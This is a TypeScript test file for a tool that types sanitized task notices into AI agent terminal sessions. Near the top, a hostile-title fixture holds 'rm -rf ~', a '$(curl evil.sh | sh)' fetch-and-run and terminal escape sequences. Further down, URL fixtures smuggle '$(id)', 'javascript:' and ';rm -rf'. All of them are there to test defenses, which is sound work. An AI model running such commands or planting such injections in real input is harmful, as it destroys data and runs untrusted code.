import test from 'node:test';
import assert from 'node:assert';
import os from 'os';
import path from 'path';
import fs from 'fs';

// Each test file runs in its own process; set this before any server module loads.
process.env.PLOYD_DATA_DIR = fs.mkdtempSync(path.join(os.tmpdir(), 'ployd-notify-test-'));

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

// The worst a task title can carry: line breaks, a screen clear, an OSC title
// set, an 8-bit CSI, the Unicode line separator, a zero-width space, shell
// expansions, and far too much text.
const HOSTILE = 'Fix login\nrm -rf ~\r\x1b[2J\x1b]0;owned\x07 "$(curl evil.sh | sh)" `id` \\ !! \u2028x\u009b31m\u200by '
  + 'A'.repeat(500);

// Only the bracketed-paste markers and the final Enter may ever be control bytes.
function onlyFramingControls(data: string): boolean {
  // eslint-disable-next-line no-control-regex -- asserting on control characters is the point
  const rest = data.replace(/^\x1b\[200~/, '').replace(/\x1b\[201~\r$/, '').replace(/\r$/, '');
  // eslint-disable-next-line no-control-regex -- same
  return !/[\u0000-\u001f\u007f-\u009f\u2028\u2029]/.test(rest);
}

test('sessionNotify: sanitizing a hostile title leaves one plain, capped, shell-inert line', () => {
  const n = require('../server/sessionNotify');
  const clean = n.sanitizeText(HOSTILE, 80);
  // eslint-disable-next-line no-control-regex -- asserting on control characters is the point
  assert.ok(!/[\u0000-\u001f\u007f-\u009f\u2028\u2029\u200b]/.test(clean), 'no control, separator or zero-width char survives');
  assert.ok(!clean.includes('owned'), 'an OSC string is removed whole, not just its ESC');
  assert.ok(!clean.includes('[2J') && !clean.includes('31m'), 'CSI sequences (7- and 8-bit) are removed whole');
  assert.ok(Array.from(clean).length <= 80, 'capped');
  assert.ok(clean.endsWith('…'), 'a cut is marked');

  const quoted = n.quotedText(HOSTILE, 80);
  assert.ok(!/["`$\\!]/.test(quoted), 'nothing a shell expands inside double quotes is left');

  const line = n.noticeFor({
    id: 'abc1234567', title: HOSTILE, status: 'failed',
    lastError: 'boom\n\x1b[31mred\x1b[0m; reboot', codeReview: { grade: 2 },
  }, 'https://github.com/o/r/pull/7');
  assert.ok(line.startsWith('[ployd] task abc1234567 "Fix login rm -rf ~ '), 'the title is one line, newlines turned into spaces');
  assert.ok(line.includes('finished: failed'), 'names the status');
  assert.ok(line.includes('grade 2/5'), 'carries the grade');
  assert.ok(line.includes('PR https://github.com/o/r/pull/7'), 'carries the PR');
  assert.ok(line.includes('error "boom red; reboot"'), 'the error is cleaned too');
  assert.strictEqual((line.match(/"/g) || []).length, 4, 'exactly the two quoted fields, nothing escapes them');
  assert.ok(Array.from(line).length <= n.MAX_LINE, 'the whole line is capped');

  for (const pasteMode of [true, false]) {
    const framed = n.frame(line + '\n\x1b[201~\x03', pasteMode);
    assert.ok(onlyFramingControls(framed), `no stray control byte when framed (paste ${pasteMode})`);
    assert.ok(framed.endsWith('\r'), 'submitted with Enter');
    assert.strictEqual(framed.startsWith('\x1b[200~'), pasteMode, 'a bracketed paste only when the program asked for one');
  }
});

test('sessionNotify: only a plain PR URL is typed, and only terminal statuses are named', () => {
  const n = require('../server/sessionNotify');
  assert.strictEqual(n.safeUrl('https://github.com/o/r/pull/7'), 'https://github.com/o/r/pull/7');
  assert.strictEqual(n.safeUrl('https://ghe.corp:8443/o/r/pull/7'), 'https://ghe.corp:8443/o/r/pull/7');
  for (const bad of ['https://x/y?a=1&b', 'https://x/$(id)', 'https://x/a;b', 'javascript:alert(1)', 'https://x/a b', `https://x/${'a'.repeat(300)}`]) {
    assert.strictEqual(n.safeUrl(bad), null, `${bad.slice(0, 30)} is refused`);
  }
  const line = n.noticeFor({ id: 't1', title: 'T', status: 'validation' }, 'https://x/a;rm -rf');
  assert.ok(!line.includes('PR'), 'a refused URL is left out, not typed');
  assert.deepStrictEqual(n.TERMINAL, ['validation', 'failed', 'done']);
});

test('terminal: draft tracking — typing starts one, Enter / Ctrl-C / Ctrl-U clear it, escapes do not count', () => {
  const terminal = require('../server/terminal');
  assert.strictEqual(terminal.draftAfter(false, 'hel'), true);
  assert.strictEqual(terminal.draftAfter(true, 'lo\r'), false);
  assert.strictEqual(terminal.draftAfter(true, '\x03'), false);
  assert.strictEqual(terminal.draftAfter(true, '\x15'), false);
  assert.strictEqual(terminal.draftAfter(false, '\x1b[A'), false, 'an arrow key is not a draft');
  assert.strictEqual(terminal.draftAfter(false, '\x1b[I'), false, 'a focus report is not a draft');
  assert.strictEqual(terminal.draftAfter(false, '\x1b[200~pasted\x1b[201~'), true, 'pasted text is');
  assert.strictEqual(terminal.draftAfter(false, 'line\rmore'), true, 'text after the last Enter is');
});

test('terminal: input restarts the output tail a notice reads, and sets the draft flag', async () => {
  const terminal = require('../server/terminal');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'ployd-notify-tail-'));
  const s = terminal.create({ cwd: dir, repoId: 'tail-repo' });
  try {
    for (let i = 0; i < 50 && !terminal.notifyTarget(s.id).tail; i++) await sleep(100);
    assert.ok(terminal.notifyTarget(s.id).tail.length > 0, 'the shell printed something');
    terminal.write(s.id, 'ech');
    const t = terminal.notifyTarget(s.id);
    assert.strictEqual(t.tail, '', 'a keystroke starts the tail over');
    assert.strictEqual(t.draft, true, 'and leaves a half-typed line');
    terminal.write(s.id, '\x15');
    assert.strictEqual(terminal.notifyTarget(s.id).draft, false);
  } finally {
    terminal.remove(s.id);
  }
});

test('terminal: a claude session gets the board on a per-session MCP URL, and every shell knows its id', () => {
  const store = require('../server/store');
  const terminal = require('../server/terminal');
  const runner = require('../server/runner');
  const prev = store.db.settings.notifySessions;
  try {
    store.db.settings.notifySessions = true;
    const line = terminal.startupLine('claude', 'sid42', undefined);
    assert.ok(line.includes('--mcp-config'), 'claude is started with an MCP config');
    const json = line.slice(line.indexOf("'") + 1, line.lastIndexOf("'"));
    const config = JSON.parse(json);
    assert.deepStrictEqual(config.mcpServers.ployd, { type: 'http', url: `${runner.resolvedBaseUrl()}/mcp?session=sid42` });
    assert.strictEqual(terminal.startupLine('codex', 'sid42', undefined), runner.CODEX_BIN, 'other agents are typed as before');
    assert.strictEqual(terminal.startupLine('shell', 'sid42', undefined), null, 'a shell types nothing');
    assert.strictEqual(terminal.startupLine('claude', 'sid42', 'npm run dev'), 'npm run dev', 'a command session types its command');
    store.db.settings.notifySessions = false;
    assert.ok(!terminal.startupLine('claude', 'sid42', undefined).includes('--mcp-config'), 'setting off: the plain claude line');
    const env = terminal.sessionEnv('sid42');
    assert.strictEqual(env.PLOYD_SESSION_ID, 'sid42');
    assert.strictEqual(env.PLOYD_URL, runner.resolvedBaseUrl());
  } finally {
    store.db.settings.notifySessions = prev;
  }
});

function addRepo(): { id: string; dir: string } {
  const store = require('../server/store');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'ployd-notify-repo-'));
  const repo = { id: store.id(), name: 'notify-repo', path: dir, branch: 'main' };
  store.db.repos.push(repo);
  return { id: repo.id, dir };
}

function toolText(result: { content: { text: string }[] }): Record<string, unknown> {
  return JSON.parse(result.content[0].text);
}

test('mcp: create_task links to a live session via origin_session, and ignores unknown or exited ones', async () => {
  const mcp = require('../server/mcp');
  const terminal = require('../server/terminal');
  const repo = addRepo();
  const live = terminal.create({ cwd: repo.dir, repoId: repo.id });
  const gone = terminal.create({ cwd: repo.dir, repoId: repo.id });
  terminal.close(gone.id);
  try {
    const linked = toolText(await mcp.callTool('create_task', { repoId: repo.id, prompt: 'p1', origin_session: live.id }));
    assert.strictEqual(linked.originSessionId, live.id, 'linked to the live session');
    assert.strictEqual(linked.originSessionLabel, live.label, 'with its label');
    assert.ok(!('origin_session' in linked), 'the argument itself is not stored');

    const unknown = toolText(await mcp.callTool('create_task', { repoId: repo.id, prompt: 'p2', origin_session: 'nope' }));
    assert.strictEqual(unknown.originSessionId, undefined, 'an unknown id is ignored, the task still created');
    const exited = toolText(await mcp.callTool('create_task', { repoId: repo.id, prompt: 'p3', origin_session: gone.id }));
    assert.strictEqual(exited.originSessionId, undefined, 'an exited session is ignored');
    const odd = toolText(await mcp.callTool('create_task', { repoId: repo.id, prompt: 'p4', origin_session: 42 }));
    assert.strictEqual(odd.originSessionId, undefined, 'a non-string is ignored');

    const def = mcp.TOOL_DEFS.find((t: { name: string }) => t.name === 'create_task');
    assert.ok(def.inputSchema.properties.origin_session, 'the argument is advertised');
    assert.ok(/PLOYD_SESSION_ID/.test(def.inputSchema.properties.origin_session.description), 'and says where its value comes from');
  } finally {
    terminal.remove(live.id);
    terminal.remove(gone.id);
  }
});

test('mcp: a per-session MCP URL (?session=) links every task created over it', async () => {
  const mcp = require('../server/mcp');
  const terminal = require('../server/terminal');
  const repo = addRepo();
  const live = terminal.create({ cwd: repo.dir, repoId: repo.id });
  const other = terminal.create({ cwd: repo.dir, repoId: repo.id });
  const post = async (query: Record<string, unknown>, args: Record<string, unknown>) => {
    let body: { result: { content: { text: string }[] } } | null = null;
    const res = { json: (b: typeof body) => { body = b; }, status: () => ({ end: () => {} }) };
    await mcp.handlePost({ query, body: { jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name: 'create_task', arguments: args } } }, res);
    return toolText(body!.result);
  };
  try {
    assert.strictEqual((await post({ session: live.id }, { repoId: repo.id, prompt: 'a' })).originSessionId, live.id, 'linked by the URL alone');
    assert.strictEqual((await post({ session: live.id }, { repoId: repo.id, prompt: 'b', origin_session: other.id })).originSessionId, live.id,
      'the URL wins over the argument');
    assert.strictEqual((await post({ session: 'bogus' }, { repoId: repo.id, prompt: 'c', origin_session: other.id })).originSessionId, other.id,
      'a bogus URL session falls back to a valid argument');
    assert.strictEqual((await post({ session: 'bogus' }, { repoId: repo.id, prompt: 'd' })).originSessionId, undefined, 'and a bogus one alone links nothing');
    assert.strictEqual((await post({ session: ['x', live.id] }, { repoId: repo.id, prompt: 'e' })).originSessionId, undefined, 'a repeated query param is ignored');
  } finally {
    terminal.remove(live.id);
    terminal.remove(other.id);
  }
});

// ---------- the notice engine, with the terminal and gh stubbed ----------

interface FakeTarget { id: string; kind: string; label: string; status: string; pid: number; pasteMode: boolean; draft: boolean; tail: string }

function harness() {
  const store = require('../server/store');
  const bus = require('../server/bus');
  const n = require('../server/sessionNotify');
  const targets = new Map<string, FakeTarget>();
  const writes: { sid: string; data: string }[] = [];
  let foreground = true;
  n.stop();
  n._setDebounce(5);
  n._setDeps({
    target: (sid: string) => (targets.has(sid) ? { ...targets.get(sid)! } : null),
    write: (sid: string, data: string) => { writes.push({ sid, data }); return true; },
    foreground: async () => foreground,
    prUrl: async () => 'https://github.com/o/r/pull/9',
  });
  n.start();
  const session = (id: string, over: Partial<FakeTarget> = {}) => {
    const t: FakeTarget = { id, kind: 'claude', label: 'Claude', status: 'idle', pid: 1, pasteMode: true, draft: false, tail: '', ...over };
    targets.set(id, t);
    return t;
  };
  const task = (sid: string, over: Record<string, unknown> = {}) => {
    const t = { id: store.id(), title: 'Fix login redirect', status: 'running', runCount: 1, originSessionId: sid, ...over };
    store.db.tasks.push(t);
    return t;
  };
  const move = (t: { status: string }, status: string, extra: Record<string, unknown> = {}) => {
    Object.assign(t, { status }, extra);
    bus.broadcast({ type: 'task', task: t });
  };
  const idle = (sid: string) => {
    const t = targets.get(sid)!;
    t.status = 'idle';
    bus.broadcast({ type: 'terminal', session: { id: sid, status: 'idle' } });
  };
  return {
    n, store, bus, targets, writes, session, task, move, idle,
    setForeground: (v: boolean) => { foreground = v; },
    done: () => { n.stop(); n._setDeps(null); n._setDebounce(4000); },
  };
}

test('sessionNotify: a linked task landing types one notice, framed as a paste and submitted', async () => {
  const h = harness();
  try {
    h.session('s1');
    const t = h.task('s1');
    h.move(t, 'validation', { codeReview: { grade: 4 } });
    h.move(t, 'validation'); // a re-broadcast of the same state
    await sleep(40);
    assert.strictEqual(h.writes.length, 1, 'one notice per landing');
    const { sid, data } = h.writes[0];
    assert.strictEqual(sid, 's1');
    assert.ok(data.startsWith('\x1b[200~[ployd] task '), 'a bracketed paste');
    assert.ok(data.endsWith('\x1b[201~\r'), 'then Enter');
    assert.ok(data.includes('"Fix login redirect" finished: validation, grade 4/5, PR https://github.com/o/r/pull/9'));

    h.move(t, 'validation');
    await sleep(20);
    assert.strictEqual(h.writes.length, 1, 'still one');
    h.move(t, 'done');
    await sleep(40);
    assert.strictEqual(h.writes.length, 2, 'reaching done is a landing of its own');
    assert.ok(h.writes[1].data.includes('finished: done'));
  } finally {
    h.done();
  }
});

test('sessionNotify: only terminal statuses notify — code_review is still in flight', async () => {
  const h = harness();
  try {
    h.session('s2');
    const t = h.task('s2');
    for (const s of ['backlog', 'ready', 'running', 'code_review']) h.move(t, s);
    await sleep(40);
    assert.strictEqual(h.writes.length, 0, 'nothing for a non-terminal status');
    // A run parks in validation, then flows into code_review inside the debounce.
    h.move(t, 'validation');
    h.move(t, 'code_review');
    await sleep(40);
    assert.strictEqual(h.writes.length, 0, 'a validation that turned into a code review is not a landing');
    h.move(t, 'validation', { codeReview: { grade: 5 } });
    await sleep(40);
    assert.strictEqual(h.writes.length, 1, 'the graded landing is');
    assert.ok(h.writes[0].data.includes('grade 5/5'));
    h.move(t, 'running');
    h.move(t, 'failed', { lastError: 'exit 1' });
    await sleep(40);
    assert.strictEqual(h.writes.length, 2, 'dispatched again and failed: a new landing');
    assert.ok(h.writes[1].data.includes('finished: failed') && h.writes[1].data.includes('error "exit 1"'));
    const unlinked = h.task('s2', { originSessionId: undefined });
    h.move(unlinked, 'validation');
    await sleep(40);
    assert.strictEqual(h.writes.length, 2, 'a task with no origin session is none of our business');
  } finally {
    h.done();
  }
});

test('sessionNotify: queued while active (or with a half-typed line, or the agent not in front), delivered on idle', async () => {
  const h = harness();
  try {
    const s = h.session('s3', { status: 'active' });
    const a = h.task('s3');
    const b = h.task('s3', { title: 'Second' });
    h.move(a, 'validation');
    h.move(b, 'failed');
    await sleep(40);
    assert.strictEqual(h.writes.length, 0, 'nothing typed while the agent is working');
    assert.strictEqual(h.n.pending('s3').length, 2, 'both wait in the queue');

    s.draft = true;
    h.idle('s3');
    await sleep(20);
    assert.strictEqual(h.writes.length, 0, 'not on top of a half-typed line');

    s.draft = false;
    h.setForeground(false);
    h.idle('s3');
    await sleep(20);
    assert.strictEqual(h.writes.length, 0, 'not while the agent was quit back to the shell');

    h.setForeground(true);
    h.idle('s3');
    await sleep(20);
    assert.strictEqual(h.writes.length, 1, 'idle again: the first notice goes out');
    assert.ok(h.writes[0].data.includes('Fix login redirect'), 'oldest first');
    s.status = 'active'; // the agent took the line and is working on it
    await h.n.pump('s3');
    assert.strictEqual(h.writes.length, 1, 'one notice per idle');
    h.idle('s3');
    await sleep(20);
    assert.strictEqual(h.writes.length, 2, 'the next idle delivers the next one');
    assert.ok(h.writes[1].data.includes('"Second" finished: failed'));
    assert.strictEqual(h.n.pending('s3').length, 0);

    s.pasteMode = false;
    const c = h.task('s3', { title: 'Third' });
    h.move(c, 'done');
    await sleep(40);
    assert.ok(h.writes[2].data.startsWith('[ployd] task ') && h.writes[2].data.endsWith('\r'), 'typed plainly when paste mode is off');
  } finally {
    h.done();
  }
});

// Screens captured from live sessions (escape sequences included, trimmed).
const CODEX_UPDATE = '\x1b[1m\u2728 Update available! 0.144.5 -> 0.166.0\x1b[0m\r\n\x1b[36m\u203a 1. Update now\x1b[0m (runs `npm install -g @openai/codex`)\r\n  2. Skip\r\n  3. Skip until next version\r\n\r\n  Press enter to continue';
const CLAUDE_PERMISSION = '\x1b[1mBash command\x1b[22m\r\n   rm -rf build\r\n Do you want to proceed?\r\n\x1b[34m\u276f\x1b[39m 1. Yes\r\n   2. Yes, and don\'t ask again for rm commands\r\n   3. No, and tell Claude what to do differently (esc)';
const CLAUDE_IDLE = '\x1b[2m\u2500\u2500\u2500\u2500\u2500\u2500\x1b[22m\r\n\u276f \r\n\x1b[2m\u2500\u2500\u2500\u2500\u2500\u2500\x1b[22m\r\n  \u23f5\u23f5 auto mode on (shift+tab to cycle) \u00b7 \u25d0 medium \u00b7 /effort';

test('sessionNotify: a menu or a yes/no prompt on screen is recognized; the agent\'s input box is not', () => {
  const n = require('../server/sessionNotify');
  assert.strictEqual(n.menuOnScreen(CODEX_UPDATE), true, "codex's update picker");
  assert.strictEqual(n.menuOnScreen(CLAUDE_PERMISSION), true, "claude's tool-approval dialog");
  assert.strictEqual(n.menuOnScreen('Do you trust the files in this folder?'), true, 'a trust prompt');
  assert.strictEqual(n.menuOnScreen('Overwrite? (y/n)'), true, 'a y/n question');
  assert.strictEqual(n.menuOnScreen(CLAUDE_IDLE), false, "claude waiting at its input box");
  assert.strictEqual(n.menuOnScreen('[ployd] task abc "Fix it" finished: validation - get_task abc for details'), false, 'our own notice');
  assert.strictEqual(n.menuOnScreen(''), false);
});

test('sessionNotify: a notice waits while a menu is on screen, so its Enter never picks an option', async () => {
  const h = harness();
  try {
    const s = h.session('menu', { tail: CODEX_UPDATE });
    h.move(h.task('menu'), 'validation');
    await sleep(40);
    assert.strictEqual(h.writes.length, 0, 'not typed into the update picker');
    assert.strictEqual(h.n.pending('menu').length, 1, 'kept for later');
    s.tail = CLAUDE_PERMISSION;
    h.idle('menu');
    await sleep(20);
    assert.strictEqual(h.writes.length, 0, 'not into a tool-approval dialog either');
    s.tail = CLAUDE_IDLE;
    h.idle('menu');
    await sleep(20);
    assert.strictEqual(h.writes.length, 1, 'delivered once the agent is back at its input box');
  } finally {
    h.done();
  }
});

test('sessionNotify: never a plain shell, never an exited session, and nothing with the setting off', async () => {
  const h = harness();
  const prev = h.store.db.settings.notifySessions;
  try {
    h.session('shell1', { kind: 'shell' });
    h.move(h.task('shell1'), 'validation');
    await sleep(40);
    assert.strictEqual(h.writes.length, 0, 'a plain shell would run the line, so it gets nothing');
    assert.strictEqual(h.n.enqueue('shell1', 'x'), false, 'and enqueue refuses it outright');

    h.session('dead', { status: 'exited' });
    h.move(h.task('dead'), 'validation');
    await sleep(40);
    assert.strictEqual(h.writes.length, 0, 'an exited session gets nothing');
    assert.strictEqual(h.n.pending('dead').length, 0, 'and nothing is kept for it');

    const busy = h.session('busy', { status: 'active' });
    h.move(h.task('busy'), 'validation');
    await sleep(40);
    assert.strictEqual(h.n.pending('busy').length, 1);
    busy.status = 'exited';
    h.bus.broadcast({ type: 'terminal', session: { id: 'busy', status: 'exited' } });
    assert.strictEqual(h.n.pending('busy').length, 0, 'a session that exits drops its queue');

    h.store.db.settings.notifySessions = false;
    h.session('off');
    h.move(h.task('off'), 'validation');
    await sleep(40);
    assert.strictEqual(h.writes.length, 0, 'setting off: nothing typed');
    h.store.db.settings.notifySessions = true;
    h.idle('off');
    await sleep(20);
    assert.strictEqual(h.writes.length, 0, 'and a landing while it was off is not replayed later');

    const q = h.session('q', { status: 'active' });
    h.move(h.task('q'), 'validation');
    await sleep(40);
    h.store.db.settings.notifySessions = false;
    q.status = 'idle';
    h.idle('q');
    await sleep(20);
    assert.strictEqual(h.writes.length, 0, 'turned off while queued: the queue is dropped, not delivered');
  } finally {
    h.store.db.settings.notifySessions = prev;
    h.done();
  }
});

test('sessionNotify: tasks already landed at boot are not announced again', async () => {
  const store = require('../server/store');
  const t = { id: store.id(), title: 'Old', status: 'validation', runCount: 1, originSessionId: 'boot' };
  store.db.tasks.push(t);
  const h = harness(); // start() seeds from the store
  try {
    h.session('boot');
    h.move(t, 'validation');
    await sleep(40);
    assert.strictEqual(h.writes.length, 0);
  } finally {
    h.done();
  }
});

test('sessionNotify: the foreground check finds the agent, not the shell at its prompt', () => {
  const n = require('../server/sessionNotify');
  const runner = require('../server/runner');
  const claude = path.basename(runner.CLAUDE_BIN);
  const codex = path.basename(runner.CODEX_BIN);
  // relay 100 -> shell 101 (pgid 101); the terminal's foreground group is 200.
  const rows = (tpgid: number, fg: string) => n.parsePs([
    '  100     1   100     0 python3 -c ...',
    `  101   100   101   ${tpgid} -zsh`,
    `  200   101   200   ${tpgid} ${fg}`,
    `  201   200   200   ${tpgid} some-helper --flag`,
  ].join('\n'));
  assert.strictEqual(n.agentInForeground(rows(200, `${claude} --mcp-config {}`), 100, 'claude'), true, 'claude in front');
  assert.strictEqual(n.agentInForeground(rows(200, `/opt/bin/${claude}`), 100, 'claude'), true, 'by full path too');
  assert.strictEqual(n.agentInForeground(rows(200, `node /usr/local/bin/${codex}`), 100, 'codex'), true, 'an interpreter-launched agent');
  assert.strictEqual(n.agentInForeground(rows(101, `${claude}`), 100, 'claude'), false, 'the shell owns the terminal: the agent was quit');
  assert.strictEqual(n.agentInForeground(rows(200, 'vim notes.md'), 100, 'claude'), false, 'some other program in front');
  assert.strictEqual(n.agentInForeground(rows(200, `${claude}`), 999, 'claude'), false, 'an unknown relay');
  assert.strictEqual(n.agentInForeground(rows(200, `${claude}`), 100, 'shell'), false, 'a shell kind never matches');
});

test('sessionNotify: a custom agent session is matched on its saved command', () => {
  const n = require('../server/sessionNotify');
  const store = require('../server/store');
  const saved = store.db.settings.sessionAgents;
  store.db.settings.sessionAgents = [{ id: 'aider', label: 'Aider', command: 'OPENAI_BASE=x aider --model sonnet' }];
  const rows = (fg: string) => n.parsePs([
    '  100     1   100     0 python3 -c ...',
    '  101   100   101   200 -zsh',
    `  200   101   200   200 ${fg}`,
  ].join('\n'));
  try {
    assert.strictEqual(n.agentInForeground(rows('/usr/local/bin/aider --model sonnet'), 100, 'custom', 'aider'), true, 'its program in front');
    assert.strictEqual(n.agentInForeground(rows('python3 /opt/aider/bin/aider'), 100, 'custom', 'aider'), true, 'through an interpreter');
    assert.strictEqual(n.agentInForeground(rows('vim notes.md'), 100, 'custom', 'aider'), false, 'some other program in front');
    assert.strictEqual(n.agentInForeground(rows('aider'), 100, 'custom', 'gone'), false, 'an agent removed from Settings matches nothing');
  } finally {
    store.db.settings.sessionAgents = saved;
  }
});

test('index: PATCH /api/settings validates notifySessions and exposes it', async () => {
  const store = require('../server/store');
  const index = require('../server/index');
  assert.strictEqual(store.DEFAULT_SETTINGS.notifySessions, true, 'on by default');
  const { server, port } = await index.start(0);
  const patch = (body: unknown) => fetch(`http://127.0.0.1:${port}/api/settings`, {
    method: 'PATCH', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body),
  });
  try {
    assert.strictEqual((await patch({ notifySessions: 'yes' })).status, 400, 'a non-boolean is refused');
    assert.strictEqual(store.db.settings.notifySessions, true, 'and changes nothing');
    const off = await patch({ notifySessions: false });
    assert.strictEqual(off.status, 200);
    assert.strictEqual((await off.json()).notifySessions, false);
    assert.strictEqual(store.db.settings.notifySessions, false);
    const on = await patch({ notifySessions: true });
    assert.strictEqual((await on.json()).notifySessions, true);
  } finally {
    await new Promise<void>((r) => server.close(() => r()));
    require('../server/sessionNotify').stop();
  }
});
